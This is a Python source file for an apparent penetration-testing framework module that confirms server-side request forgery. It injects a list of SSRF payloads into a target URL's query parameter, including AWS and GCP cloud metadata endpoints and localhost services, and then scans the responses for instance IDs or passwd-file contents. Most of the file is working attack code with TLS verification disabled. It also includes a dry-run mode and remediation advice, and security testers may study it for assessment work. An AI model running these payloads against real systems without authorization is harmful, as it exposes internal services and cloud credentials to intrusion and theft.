"""
ARES Module - Server-Side Request Forgery (SSRF) Validator

Confirms SSRF by forcing the target to make requests to internal
metadata endpoints (AWS, GCP, Azure) or localhost services.
"""
from __future__ import annotations
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ares.core.errors import ConnectionTimeout, ModuleValidationError
from ares.sdk import BaseModule, ExecutionContext, ModuleResult, OpsecLevel, Severity

class WebSsrfInternalModule(BaseModule):
    """Confirm SSRF against internal metadata endpoints."""
    
    MODULE_ID          = "web.ssrf_internal"
    MODULE_NAME        = "SSRF Internal Metadata Validator"
    MODULE_CATEGORY    = "web"
    MODULE_DESCRIPTION = "Force target to request internal metadata endpoints to confirm SSRF"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = []
    OUTPUTS            = ["ssrf_confirmed"]
    MITRE_TECHNIQUES   = ["T1190"]
    MODULE_AUTHOR      = "TrinityBerserker <gbsfiunam@gmail.com>"

    async def validate(self, ctx: ExecutionContext) -> None:
        ctx.require("target")
        if "target_url" not in ctx.params:
            ctx.params["target_url"] = f"http://{ctx.target}"
        if not ctx.params["target_url"].startswith(("http://", "https://")):
            raise ModuleValidationError("Invalid URL", module_id=self.MODULE_ID, field="target_url")

    async def execute(self, ctx: ExecutionContext) -> ModuleResult:
        target_url = ctx.params.get("target_url", f"http://{ctx.target}")
        result = ModuleResult(module_id=self.MODULE_ID, execution_id=ctx.execution_id)
        await self.before_request(ctx.target, action="ssrf_internal")

        if ctx.dry_run:
            result.status = "success"
            result.artifacts = {"target_url": target_url, "simulated": True}
            return result

        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:80/",
            "http://localhost:8080/",
        ]

        for payload in payloads:
            test_url = self._inject_payload(target_url, payload)
            try:
                response = await self._http_get(test_url, timeout=5)
                if response and response.status_code < 500:
                    if any(kw in response.text.lower() for kw in ["ami-", "instance-id", "metadata", "root:x:"]):
                        f = self.finding(
                            title=f"SSRF confirmed on {ctx.target}",
                            description=f"Payload '{payload}' returned sensitive internal data.",
                            severity=Severity.HIGH,
                            mitre_technique="T1190",
                            host=ctx.target,
                            evidence={"payload": payload, "status": response.status_code},
                        )
                        result.findings.append(f)
                        result.status = "success"
                        result.artifacts = {"target_url": target_url, "vulnerable": True}
                        return result
            except Exception:
                continue

        result.status = "success"
        result.artifacts = {"target_url": target_url, "vulnerable": False}
        return result

    def report(self, result: ModuleResult) -> dict:
        base = super().report(result)
        base["narrative"] = "SSRF validation completed. Check for internal metadata exposure."
        base["recommendations"] = ["Block outbound requests to internal IPs.", "Use allowlists for outbound requests."]
        return base

    def _inject_payload(self, url: str, payload: str) -> str:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        if not query_params:
            raise ModuleValidationError("URL has no query parameters", module_id=self.MODULE_ID, field="target_url")
        for key in query_params:
            query_params[key] = [payload]
            break
        new_query = urlencode(query_params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    async def _http_get(self, url: str, timeout: float) -> Any:
        import httpx
        try:
            async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
                return await client.get(url, follow_redirects=True)
        except httpx.TimeoutException:
            raise ConnectionTimeout(f"Timeout for {url}", module_id=self.MODULE_ID, target=url, timeout_s=timeout)
